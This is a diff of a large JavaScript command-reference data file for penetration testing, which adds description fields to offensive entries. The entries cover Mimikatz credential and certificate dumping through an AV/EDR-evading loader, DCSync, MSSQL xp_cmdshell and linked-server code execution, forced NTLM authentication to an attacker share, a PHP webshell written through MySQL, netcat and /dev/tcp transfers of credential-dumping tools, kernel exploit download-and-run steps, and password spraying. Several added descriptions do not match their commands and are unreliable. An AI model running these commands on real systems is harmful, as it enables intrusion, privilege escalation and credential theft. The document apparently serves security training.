+          "command": "Loader.exe -path C:\\AD\\Tools\\mimikatz.exe -args crypto::capi crypto::cng \"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE\" exit",
+          "description": "Runs a Mimikatz operation through an evasive loader (e.g., SafetyKatz) to bypass antivirus and EDR detections that would flag direct Mimikatz execution."
         },
         {
           "label": "List certificates before exporting",
-          "command": "Invoke-Mimikatz -Command '\"crypto::certificates\"'"
+          "command": "Invoke-Mimikatz -Command '\"crypto::certificates\"'",
+          "description": "Runs Mimikatz operations via reflective PowerShell loading - executes entirely in memory without writing to disk."
         }
       ],
       "examples": [
@@ -87023,42 +87527,50 @@ const COMMAND_DATA = {
         {
           "command": "lsadump::lsa /patch",
           "caption": "Dump LSA secrets - often reveals service account credentials in cleartext",
-          "label": "lsadump::lsa"
+          "label": "lsadump::lsa",
+          "description": "Dumps LSA secrets including service account passwords, cached domain credentials, and computer account passwords from the local security database."
         },
         {
           "command": "token::elevate",
           "caption": "Impersonate SYSTEM token from local admin context",
-          "label": "token::elevate"
+          "label": "token::elevate",
+          "description": "Impersonates a SYSTEM token using Mimikatz. Escalates the current session to NT AUTHORITY\\SYSTEM for operations requiring the highest local privilege."
         },
         {
           "command": "kerberos::purge",
           "caption": "Purge all Kerberos tickets from current session (clean slate before PTT)",
-          "label": "kerberos::purge"
+          "label": "kerberos::purge",
+          "description": "Purges all Kerberos tickets from the current session. Clears cached tickets before injecting a forged or stolen ticket to avoid conflicts."
         },
         {
           "command": "kerberos::list /export",
           "caption": "List and export all Kerberos tickets to disk (.kirbi files)",
-          "label": "kerberos::list"
+          "label": "kerberos::list",
+          "description": "Lists all Kerberos tickets cached in the current logon session. Shows TGTs and service tickets without dumping them from LSASS."
         },
         {
           "command": "misc::cmd",
           "caption": "Spawn a new cmd.exe with current mimikatz token context",
-          "label": "misc::cmd"
+          "label": "misc::cmd",
+          "description": "Spawns a new command prompt from within Mimikatz. Opens a cmd.exe that inherits the tokens and tickets loaded in the current Mimikatz session."
         },
         {
           "command": "lsadump::dcsync /user:Administrator",
           "caption": "DCSync - dump specific user hash from DC replication (requires domain admin or replication rights)",
-          "label": "DCSync - one user"
+          "label": "DCSync - one user",
+          "description": "Performs DCSync by simulating a domain controller replication request (DRSUAPI). Extracts password hashes for any account from the DC without running code on it - requires DA or replication privileges."
         },
         {
           "command": "lsadump::dcsync /domain:<domain> /all /csv",
           "caption": "DCSync - dump all domain hashes as CSV",
-          "label": "DCSync - whole domain (CSV)"
+          "label": "DCSync - whole domain (CSV)",
+          "description": "Performs DCSync by simulating a domain controller replication request (DRSUAPI). Extracts password hashes for any account from the DC without running code on it - requires DA or replication privileges."
         },
         {
           "command": ".\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" \"lsadump::lsa /patch\" \"exit\"",
           "caption": "One-liner: full dump sequence from cmd.exe",
-          "label": ".\\mimikatz.exe"
+          "label": ".\\mimikatz.exe",
+          "description": "Extracts password hashes from the local SAM database. Dumps NTLM hashes for all local user accounts on the machine."
         }
       ],
       "examples": [
@@ -88822,11 +89334,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Compiled C# / EXE build",
-          "command": "MS16-032.exe"
+          "command": "MS16-032.exe",
+          "description": "Exploits the MS16-032 secondary logon handle privilege escalation vulnerability. Targets unpatched Windows systems for local privilege escalation to SYSTEM."
         },
         {
           "label": "Meterpreter local exploit",
-          "command": "use exploit/windows/local/ms16_032_secondary_logon_handle_privesc"
+          "command": "use exploit/windows/local/ms16_032_secondary_logon_handle_privesc",
+          "description": "Configures a Metasploit module for exploitation. Sets the target, payload, and options before launching the exploit."
         }
       ],
       "steps": [
@@ -90003,11 +90517,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Enumerate links",
-          "command": "SELECT * FROM master..sysservers"
+          "command": "SELECT * FROM master..sysservers",
+          "description": "Executes a SQL query for data extraction or enumeration. Retrieves specific data from the target database."
         },
         {
           "label": "Chain execution",
-          "command": "EXECUTE('EXECUTE(''xp_cmdshell ''''whoami'''''') AT [<link2>]') AT [<link1>]"
+          "command": "EXECUTE('EXECUTE(''xp_cmdshell ''''whoami'''''') AT [<link2>]') AT [<link1>]",
+          "description": "Executes operating system commands through SQL Server's xp_cmdshell stored procedure. Provides command-line access on the database server from a SQL connection."
         }
       ],
       "explain": "Linked servers let one SQL Server run queries on another, often with stored higher-privilege credentials.:\n  EXECUTE('<query>') AT [<linked_server>]\nLinked servers let you run queries (and xp_cmdshell) on OTHER SQL servers the current one trusts (`EXEC ..."
@@ -90230,7 +90746,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "xp_subdirs variant",
-          "command": "EXEC master..xp_subdirs '\\\\<attacker_ip>\\share\\'"
+          "command": "EXEC master..xp_subdirs '\\\\<attacker_ip>\\share\\'",
+          "description": "Remote File Inclusion (RFI) payload using a UNC path. Forces the server to load a file from your SMB share - works on Windows targets when the PHP allow_url_include setting or SMB outbound is permitted."
         }
       ],
       "explain": "Forces SQL Server to authenticate to an attacker-controlled SMB share by listing it with xp_dirtree (or xp_subdirs), leaking the SQL service account's NetNTLM hash.:\n  <attacker_ip>  your attacker IP\nForce the MSSQL service to authenticate to your Responder via `xp_dirtree '\\\\<lhost>\\share'` - captures the service account's NetNTLMv2 hash to crack or relay."
@@ -90441,11 +90958,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Enable it first if disabled",
-          "command": "EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"
+          "command": "EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;",
+          "description": "Enable it first if disabled. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Via linked server",
-          "command": "EXECUTE('xp_cmdshell ''whoami''') AT [<linked_server>]"
+          "command": "EXECUTE('xp_cmdshell ''whoami''') AT [<linked_server>]",
+          "description": "Executes operating system commands through SQL Server's xp_cmdshell stored procedure. Provides command-line access on the database server from a SQL connection."
         }
       ],
       "explain": "Runs operating-system commands through SQL Server via the xp_cmdshell extended procedure, giving code execution as the SQL service account.:\n  xp_cmdshell '<command>'\n`EXEC xp_cmdshell 'whoami'` runs OS commands as the SQL service account (nt service\\mssql$sqlexpress in Ch10)."
@@ -90662,15 +91181,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Enable + run in one query",
-          "command": "EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"
+          "command": "EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;",
+          "description": "Executes operating system commands through SQL Server's xp_cmdshell stored procedure. Provides command-line access on the database server from a SQL connection."
         },
         {
           "label": "Run an OS command",
-          "command": "EXEC xp_cmdshell 'whoami'"
+          "command": "EXEC xp_cmdshell 'whoami'",
+          "description": "Executes operating system commands through SQL Server's xp_cmdshell stored procedure. Provides command-line access on the database server from a SQL connection."
         },
         {
           "label": "PowerUpSQL",
-          "command": "Invoke-SQLOSCmd -Instance <instance> -Command 'whoami' -RawResults"
+          "command": "Invoke-SQLOSCmd -Instance <instance> -Command 'whoami' -RawResults",
+          "description": "Executes operating system commands through SQL Server using PowerUpSQL. Leverages xp_cmdshell or other execution methods for command execution from a database compromise."
         }
       ],
       "steps": [
@@ -90762,11 +91284,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "sqlcmd (Windows)",
-          "command": "sqlcmd -S <server> -U <user> -P '<password>'"
+          "command": "sqlcmd -S <server> -U <user> -P '<password>'",
+          "description": "Connects to a Microsoft SQL Server instance using the native sqlcmd client. Supports Windows and SQL authentication for database enumeration and command execution."
         },
         {
           "label": "sqsh (Linux)",
-          "command": "sqsh -S <ip> -U <user> -P '<password>' -h"
+          "command": "sqsh -S <ip> -U <user> -P '<password>' -h",
+          "description": "Connects to a Microsoft SQL Server from Linux using sqsh. Interactive SQL client that supports xp_cmdshell execution for OS-level access."
         }
       ],
       "opsec": "loud",
@@ -91058,11 +91582,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "PowerUpSQL domain discovery",
-          "command": "Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose"
+          "command": "Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose",
+          "description": "PowerUpSQL domain discovery. See the command syntax for exact parameters and flags."
         },
         {
           "label": "nmap MSSQL info",
-          "command": "nmap -p1433 --script ms-sql-info,ms-sql-ntlm-info <target>"
+          "command": "nmap -p1433 --script ms-sql-info,ms-sql-ntlm-info <target>",
+          "description": "Scans Microsoft SQL Server with nmap NSE scripts for instance discovery, version detection, and configuration enumeration."
         }
       ],
       "steps": [
@@ -91169,11 +91695,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Nmap ms-sql script suite",
-          "command": "sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <ip>"
+          "command": "sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <ip>",
+          "description": "Scans Microsoft SQL Server with nmap NSE scripts for instance discovery, version detection, and configuration enumeration."
         },
         {
           "label": "Metasploit mssql_ping",
-          "command": "use auxiliary/scanner/mssql/mssql_ping\nset rhosts <ip>\nrun"
+          "command": "use auxiliary/scanner/mssql/mssql_ping\nset rhosts <ip>\nrun",
+          "description": "Configures a Metasploit module for exploitation. Sets the target, payload, and options before launching the exploit."
         }
       ],
       "opsec": "loud",
@@ -91483,7 +92011,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Find impersonatable logins",
-          "command": "SELECT name FROM sys.server_permissions p JOIN sys.server_principals s ON p.grantor_principal_id=s.principal_id WHERE permission_name='IMPERSONATE'"
+          "command": "SELECT name FROM sys.server_permissions p JOIN sys.server_principals s ON p.grantor_principal_id=s.principal_id WHERE permission_name='IMPERSONATE'",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "steps": [
@@ -91731,35 +92260,43 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Run OS command across the link chain",
-          "command": "Get-SQLServerLinkCrawl -Instance <ip> -Query \"exec master..xp_cmdshell 'whoami'\""
+          "command": "Get-SQLServerLinkCrawl -Instance <ip> -Query \"exec master..xp_cmdshell 'whoami'\"",
+          "description": "Run OS command across the link chain. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Enumerate linked SQL server info",
-          "command": "Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose"
+          "command": "Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose",
+          "description": "Enumerate linked SQL server info. See the command syntax for exact parameters and flags."
         },
         {
           "label": "List linked servers (PowerUpSQL)",
-          "command": "Get-SQLServerLink -Instance <ip> -Verbose"
+          "command": "Get-SQLServerLink -Instance <ip> -Verbose",
+          "description": "List linked servers (PowerUpSQL). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Manual link enum (sysservers)",
-          "command": "SELECT * FROM master..sysservers"
+          "command": "SELECT * FROM master..sysservers",
+          "description": "Manual link enum (sysservers). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Query across a link (openquery)",
-          "command": "SELECT * FROM openquery(\"<linked_server>\", 'SELECT system_user')"
+          "command": "SELECT * FROM openquery(\"<linked_server>\", 'SELECT system_user')",
+          "description": "Query across a link (openquery). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Nested openquery (multi-hop)",
-          "command": "SELECT * FROM openquery(\"<link1>\", 'SELECT * FROM openquery(\"<link2>\", ''SELECT system_user'')')"
+          "command": "SELECT * FROM openquery(\"<link1>\", 'SELECT * FROM openquery(\"<link2>\", ''SELECT system_user'')')",
+          "description": "Nested openquery (multi-hop). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Enable xp_cmdshell across a link",
-          "command": "EXECUTE('sp_configure ''show advanced options'',1;reconfigure;sp_configure ''xp_cmdshell'',1;reconfigure;') AT \"<linked_server>\""
+          "command": "EXECUTE('sp_configure ''show advanced options'',1;reconfigure;sp_configure ''xp_cmdshell'',1;reconfigure;') AT \"<linked_server>\"",
+          "description": "Enable xp_cmdshell across a link. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Targeted RCE across the chain (-QueryTarget)",
-          "command": "Get-SQLServerLinkCrawl -Instance <ip> -Query \"exec master..xp_cmdshell 'whoami'\" -QueryTarget <final_server>"
+          "command": "Get-SQLServerLinkCrawl -Instance <ip> -Query \"exec master..xp_cmdshell 'whoami'\" -QueryTarget <final_server>",
+          "description": "Targeted RCE across the chain (-QueryTarget). See the command syntax for exact parameters and flags."
         }
       ],
       "explain": "Crawls MSSQL linked-server chains with PowerUpSQL to find and abuse trust links between SQL instances:\n  Get-SQLServerLinkCrawl    follow every linked server recursively from the entry instance\n  -Instance <ip>            the SQL server to start crawling from\n  -Verbose                  show each hop, its login context, and sysadmin status\nAdd -Query 'exec master..xp_cmdshell ...' to run OS commands on any reachable linked node (enabling xp_cmdshell across the link if needed) - links can cross domain/trust boundaries."
@@ -91961,11 +92498,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "SQL auth",
-          "command": "mssqlclient.py <user>:<password>@<target>"
+          "command": "mssqlclient.py <user>:<password>@<target>",
+          "description": "Uses Impacket mssqlclient to connect to a Microsoft SQL Server instance for database enumeration and exploitation. Supports Windows authentication (via Kerberos or NTLM) and SQL authentication."
         },
         {
           "label": "Pass-the-ticket",
-          "command": "KRB5CCNAME=<ccache> mssqlclient.py -k <domain>/<user>@<target_fqdn>"
+          "command": "KRB5CCNAME=<ccache> mssqlclient.py -k <domain>/<user>@<target_fqdn>",
+          "description": "Uses Impacket mssqlclient to connect to a Microsoft SQL Server instance for database enumeration and exploitation. Supports Windows authentication (via Kerberos or NTLM) and SQL authentication."
         }
       ],
       "explain": "Connects to Microsoft SQL Server with impacket for command execution or pivoting:\n  mssqlclient.py           the MSSQL client\n  <domain>/<user>@<target>   the account and SQL host\n  -windows-auth            authenticate with Windows/NTLM domain creds (omit for SQL auth user:pass@host)\nOnce connected, enable_xp_cmdshell gives OS command execution, or use linked servers to pivot; -k reuses a Kerberos ticket."
@@ -92001,15 +92540,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Disable TLS if it errors",
-          "command": "mysql -u <user> -p<password> -h <ip> --ssl=0"
+          "command": "mysql -u <user> -p<password> -h <ip> --ssl=0",
+          "description": "Connects to a MySQL database server. Interactive client for database enumeration, data extraction, and potentially OS command execution via UDF or file write functions."
         },
         {
           "label": "Read a local file (needs FILE priv)",
-          "command": "mysql> SELECT LOAD_FILE('/etc/passwd');"
+          "command": "mysql> SELECT LOAD_FILE('/etc/passwd');",
+          "description": "Read a local file (needs FILE priv). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Write a webshell to the web root",
-          "command": "mysql> SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/sh.php';"
+          "command": "mysql> SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/sh.php';",
+          "description": "Write a webshell to the web root. See the command syntax for exact parameters and flags."
         }
       ],
       "steps": [
@@ -92275,11 +92817,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Nmap MySQL scripts",
-          "command": "sudo nmap <ip> -sV -sC -p3306 --script mysql*"
+          "command": "sudo nmap <ip> -sV -sC -p3306 --script mysql*",
+          "description": "Scans MySQL services with nmap NSE scripts for version detection, empty password testing, and configuration enumeration."
         },
         {
           "label": "Connect (no password)",
-          "command": "mysql -u root -h <ip>"
+          "command": "mysql -u root -h <ip>",
+          "description": "Connects to a MySQL database server. Interactive client for database enumeration, data extraction, and potentially OS command execution via UDF or file write functions."
         }
       ],
       "opsec": "moderate",
@@ -92848,15 +93392,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Domain admins",
-          "command": "net group \"Domain Admins\" /domain"
+          "command": "net group \"Domain Admins\" /domain",
+          "description": "Enumerates domain groups and their members using the net command. Quick way to check domain group memberships from a basic command prompt."
         },
         {
           "label": "Current user's groups",
-          "command": "net user <user> /domain"
+          "command": "net user <user> /domain",
+          "description": "Enumerates local or domain user accounts using the net command. Built-in Windows tool that works without importing modules - useful for initial enumeration from a basic shell."
         },
         {
           "label": "Password policy",
-          "command": "net accounts /domain"
+          "command": "net accounts /domain",
+          "description": "Displays the domain password and lockout policy. Shows minimum password length, lockout threshold, lockout duration, and password history - essential for calibrating password spray attacks."
         }
       ],
       "explain": "Enumerates the domain with the built-in net command (LOTL):\n  net <object> /domain   query the domain rather than the local host\nWith no tools to install, 'net user /domain', 'net group \"Domain Admins\" /domain', and 'net accounts /domain' list users, group membership, and the password policy from any domain-joined host."
@@ -93033,7 +93580,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Then enumerate with rpcclient",
-          "command": "rpcclient -U \"\" -N <dc_ip> -c enumdomusers"
+          "command": "rpcclient -U \"\" -N <dc_ip> -c enumdomusers",
+          "description": "Then enumerate with rpcclient. See the command syntax for exact parameters and flags."
         }
       ],
       "explain": "Opens a null session to a DC's IPC$ share from Windows:\n  net use \\\\<dc_host>\\ipc$   connect to the inter-process comms share\n  \"\" /u:\"\"                    empty password, empty username (anonymous)\nIf allowed, this enables anonymous RPC enumeration ('net user /domain', 'net group /domain'); rarely works on patched modern Windows but still common on legacy servers."
@@ -93870,15 +94418,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "TCP single port",
-          "command": "nc -nv -w 1 -z <ip> <port>"
+          "command": "nc -nv -w 1 -z <ip> <port>",
+          "description": "Uses netcat for port scanning (-z flag). Lightweight connectivity check when nmap is unavailable."
         },
         {
           "label": "TCP port range",
-          "command": "nc -nvv -w 1 -z <ip> <port_start>-<port_end>"
+          "command": "nc -nvv -w 1 -z <ip> <port_start>-<port_end>",
+          "description": "Uses netcat for port scanning (-z flag). Lightweight connectivity check when nmap is unavailable."
         },
         {
           "label": "UDP port range",
-          "command": "nc -nv -u -z -w 1 <ip> <port_start>-<port_end>"
+          "command": "nc -nv -u -z -w 1 <ip> <port_start>-<port_end>",
+          "description": "Uses netcat for port scanning (-z flag). Lightweight connectivity check when nmap is unavailable."
         }
       ],
       "examples": [
@@ -94103,19 +94654,23 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Receiver listens (target)",
-          "command": "nc -l -p 8000 > SharpKatz.exe\n# ncat: ncat -l -p 8000 --recv-only > SharpKatz.exe"
+          "command": "nc -l -p 8000 > SharpKatz.exe\n# ncat: ncat -l -p 8000 --recv-only > SharpKatz.exe",
+          "description": "Starts a netcat listener on a specific port. Catches incoming reverse shell connections or receives file transfers from the target."
         },
         {
           "label": "Sender pushes (attacker)",
-          "command": "nc -q 0 <lhost> 8000 < SharpKatz.exe\n# ncat: ncat --send-only <lhost> 8000 < SharpKatz.exe"
+          "command": "nc -q 0 <lhost> 8000 < SharpKatz.exe\n# ncat: ncat --send-only <lhost> 8000 < SharpKatz.exe",
+          "description": "Uses netcat for network connections, file transfers, or shell access. Versatile networking utility available on most Unix systems."
         },
         {
           "label": "Attacker serves, target pulls",
-          "command": "# attacker: sudo nc -l -p 443 -q 0 < SharpKatz.exe\n# target:   nc <lhost> 443 > SharpKatz.exe"
+          "command": "# attacker: sudo nc -l -p 443 -q 0 < SharpKatz.exe\n# target:   nc <lhost> 443 > SharpKatz.exe",
+          "description": "Attacker serves, target pulls. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Receive via /dev/tcp (no nc)",
-          "command": "cat < /dev/tcp/<lhost>/443 > SharpKatz.exe"
+          "command": "cat < /dev/tcp/<lhost>/443 > SharpKatz.exe",
+          "description": "Receive via /dev/tcp (no nc). See the command syntax for exact parameters and flags."
         }
       ],
       "opsec": "quiet",
@@ -94423,11 +94978,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Verbose (direction + type)",
-          "command": "netdom query /domain:<domain> trust /verbose"
+          "command": "netdom query /domain:<domain> trust /verbose",
+          "description": "Verbose (direction + type). See the command syntax for exact parameters and flags."
         },
         {
           "label": "List DCs / workstations too",
-          "command": "netdom query /domain:<domain> dc"
+          "command": "netdom query /domain:<domain> dc",
+          "description": "List DCs / workstations too. See the command syntax for exact parameters and flags."
         }
       ],
       "steps": [
@@ -94515,15 +95072,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "WinRM",
-          "command": "netexec winrm <ip> -u <userlist> -p <wordlist>"
+          "command": "netexec winrm <ip> -u <userlist> -p <wordlist>",
+          "description": "Uses CrackMapExec with the WinRM protocol for remote command execution over HTTP/S (port 5985/5986). Less commonly monitored than SMB-based execution."
         },
         {
           "label": "SMB",
-          "command": "netexec smb <ip> -u <userlist> -p <wordlist>"
+          "command": "netexec smb <ip> -u <userlist> -p <wordlist>",
+          "description": "Uses CrackMapExec for network authentication testing and remote operations across multiple protocols and targets."
         },
         {
           "label": "SMB + Shares",
-          "command": "netexec smb <ip> -u <user> -p <password> --shares"
+          "command": "netexec smb <ip> -u <user> -p <password> --shares",
+          "description": "Uses CrackMapExec to enumerate accessible SMB shares on target hosts. Lists shares and your permission level (READ/WRITE) - identifies data access and potential write targets for payload deployment."
         }
       ],
       "opsec": "loud",
@@ -94730,15 +95290,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Subnet Spray",
-          "command": "netexec smb <cidr> -u <user> -d . -H <nt_hash>"
+          "command": "netexec smb <cidr> -u <user> -d . -H <nt_hash>",
+          "description": "Uses CrackMapExec for network authentication testing and remote operations across multiple protocols and targets."
         },
         {
           "label": "Command Exec",
-          "command": "netexec smb <ip> -u <user> -d . -H <nt_hash> -x whoami"
+          "command": "netexec smb <ip> -u <user> -d . -H <nt_hash> -x whoami",
+          "description": "Uses CrackMapExec to execute a command on the target via SMB (cmd.exe). Remote command execution with the output returned - useful for quick checks across multiple hosts."
         },
         {
           "label": "Local Auth",
-          "command": "netexec smb <cidr> -u <user> -H <nt_hash> --local-auth"
+          "command": "netexec smb <cidr> -u <user> -H <nt_hash> --local-auth",
+          "description": "Authenticates using local (SAM) credentials instead of domain credentials. Tests whether a local admin password or hash works on target machines."
         }
       ],
       "opsec": "loud",
@@ -95041,7 +95604,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "LDAP / WinRM protocols too",
-          "command": "netexec winrm <cidr> -u <userlist> -p '<password>' | grep +"
+          "command": "netexec winrm <cidr> -u <userlist> -p '<password>' | grep +",
+          "description": "Uses CrackMapExec with the WinRM protocol for remote command execution over HTTP/S (port 5985/5986). Less commonly monitored than SMB-based execution."
         }
       ],
       "explain": "Sprays one password against many accounts (optionally across a subnet):\n  netexec smb <cidr>       the SMB module against a whole subnet\n  -u <userlist>            the accounts to try\n  -p '<password>'          the single password sprayed to all\nSpraying (many users, one password) stays under lockout thresholds - the reverse of brute forcing; works over winrm/ldap too."
@@ -95211,11 +95775,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "gMSADumper (Python)",
-          "command": "python3 gMSADumper.py -u <user> -p <password> -d <domain>"
+          "command": "python3 gMSADumper.py -u <user> -p <password> -d <domain>",
+          "description": "Runs a Python-based tool or script for exploitation, enumeration, or post-exploitation activities."
         },
         {
           "label": "PowerView (on-host)",
-          "command": "Get-DomainObject -Identity <gmsa_account> -Properties msds-managedpassword"
+          "command": "Get-DomainObject -Identity <gmsa_account> -Properties msds-managedpassword",
+          "description": "Queries any Active Directory object by identity using PowerView. Generic object lookup that returns all properties - useful when you need the full raw AD object data."
         }
       ],
       "steps": [
@@ -95294,7 +95860,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "LSA",
-          "command": "netexec smb <ip> --local-auth -u <user> -p <password> --lsa"
+          "command": "netexec smb <ip> --local-auth -u <user> -p <password> --lsa",
+          "description": "Uses CrackMapExec to dump LSA secrets from the target. Extracts service account passwords, cached credentials, and DPAPI secrets."
         }
       ],
       "opsec": "loud",
@@ -95506,15 +96073,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "CVE-2021-22555 (2.6 - 5.11)",
-          "command": "wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c\ngcc -m32 -static exploit.c -o exploit\n./exploit"
+          "command": "wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c\ngcc -m32 -static exploit.c -o exploit\n./exploit",
+          "description": "Downloads a file or script from a remote URL. Used for staging tools, payloads, or second-stage code on the target."
         },
         {
           "label": "CVE-2022-25636 (5.4 - 5.6.10)",
-          "command": "git clone https://github.com/Bonfee/CVE-2022-25636.git && cd CVE-2022-25636 && make\n./exploit"
+          "command": "git clone https://github.com/Bonfee/CVE-2022-25636.git && cd CVE-2022-25636 && make\n./exploit",
+          "description": "CVE-2022-25636 (5.4 - 5.6.10). See the command syntax for exact parameters and flags."
         },
         {
           "label": "CVE-2023-32233 (up to 6.3.1)",
-          "command": "git clone https://github.com/Liuk3r/CVE-2023-32233 && cd CVE-2023-32233\ngcc -Wall -o exploit exploit.c -lmnl -lnftnl\n./exploit"
+          "command": "git clone https://github.com/Liuk3r/CVE-2023-32233 && cd CVE-2023-32233\ngcc -Wall -o exploit exploit.c -lmnl -lnftnl\n./exploit",
+          "description": "CVE-2023-32233 (up to 6.3.1). See the command syntax for exact parameters and flags."
         }
       ],
       "opsec": "loud",
@@ -96062,27 +96632,32 @@ const COMMAND_DATA = {
         {
           "command": "nikto -h <url>",
           "caption": "Full default scan (all tuning categories)",
-          "label": "nikto -h"
+          "label": "nikto -h",
+          "description": "Scans a web server for known vulnerabilities, misconfigurations, and dangerous default files using Nikto. Identifies outdated software versions and common security issues."
         },
         {
           "command": "nikto -h https://<target> -ssl",
           "caption": "HTTPS target scan",
-          "label": "nikto -h https://<target> -ssl"
+          "label": "nikto -h https://<target> -ssl",
+          "description": "Nikto -h https://<target> -ssl. See the command syntax for exact parameters and flags."
         },
         {
           "command": "nikto -h <target> -Tuning 1 -output nikto-output.txt",
           "caption": "Interesting files scan, save output",
-          "label": "nikto -h -Tuning 1"
+          "label": "nikto -h -Tuning 1",
+          "description": "Runs Nikto with specific scan tuning options to focus on particular vulnerability categories. Reduces noise by testing only relevant check types."
         },
         {
           "command": "nikto -h <target> -Tuning 2 -Format xml -output nikto.xml",
           "caption": "Misconfiguration scan, XML output",
-          "label": "nikto -h -Tuning 2"
+          "label": "nikto -h -Tuning 2",
+          "description": "Runs Nikto with specific scan tuning options to focus on particular vulnerability categories. Reduces noise by testing only relevant check types."
         },
         {
           "command": "sudo apt install -y perl && sudo apt install -y nikto",
           "caption": "Install nikto",
-          "label": "Install nikto"
+          "label": "Install nikto",
+          "description": "Scans a web server for known vulnerabilities, misconfigurations, and dangerous default files using Nikto. Identifies outdated software versions and common security issues."
         }
       ],
       "examples": [
@@ -96566,19 +97141,23 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "With periodic progress",
-          "command": "sudo nmap <ip> -p- -sV --stats-every=5s"
+          "command": "sudo nmap <ip> -p- -sV --stats-every=5s",
+          "description": "Runs an nmap scan with version detection, TCP connect scan, all 65535 TCP ports, periodic progress reporting for detailed service enumeration and target analysis."
         },
         {
           "label": "Verbose (report opens as found)",
-          "command": "sudo nmap <ip> -p- -sV -v"
+          "command": "sudo nmap <ip> -p- -sV -v",
+          "description": "Runs an nmap scan with version detection, all 65535 TCP ports, verbose output (reports open ports as found) for detailed service enumeration and target analysis."
         },
         {
           "label": "With packet trace",
-          "command": "sudo nmap <ip> -p- -sV -Pn -n --disable-arp-ping --packet-trace"
+          "command": "sudo nmap <ip> -p- -sV -Pn -n --disable-arp-ping --packet-trace",
+          "description": "Runs an nmap scan with version detection, all 65535 TCP ports, aggressive mode (OS detection, versions, scripts, traceroute), packet trace/reason diagnostics for detailed service enumeration and target analysis."
         },
         {
           "label": "OS detection with aggressive guess (OSCP Ch6 canonical)",
-          "command": "sudo nmap -O <ip> --osscan-guess\n# -O = enable OS detection (requires root)\n# --osscan-guess = lower the confidence threshold; still reports best guess even when match is ambiguous\n# Follow with -sT -A for service+script details on the same host"
+          "command": "sudo nmap -O <ip> --osscan-guess\n# -O = enable OS detection (requires root)\n# --osscan-guess = lower the confidence threshold; still reports best guess even when match is ambiguous\n# Follow with -sT -A for service+script details on the same host",
+          "description": "Runs an nmap scan with TCP connect scan, aggressive mode (OS detection, versions, scripts, traceroute), OS detection, aggressive OS fingerprint guessing for detailed service enumeration and target analysis."
         }
       ],
       "opsec": "moderate",
@@ -96779,15 +97358,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "From an IP list (-iL)",
-          "command": "sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d\" \" -f5"
+          "command": "sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d\" \" -f5",
+          "description": "Performs a host discovery sweep (ping scan) without port scanning. Quickly identifies live hosts on the network for further enumeration."
         },
         {
           "label": "Multiple specific IPs",
-          "command": "sudo nmap -sn -oA tnet 10.129.2.18 10.129.2.19 10.129.2.20 | grep for | cut -d\" \" -f5"
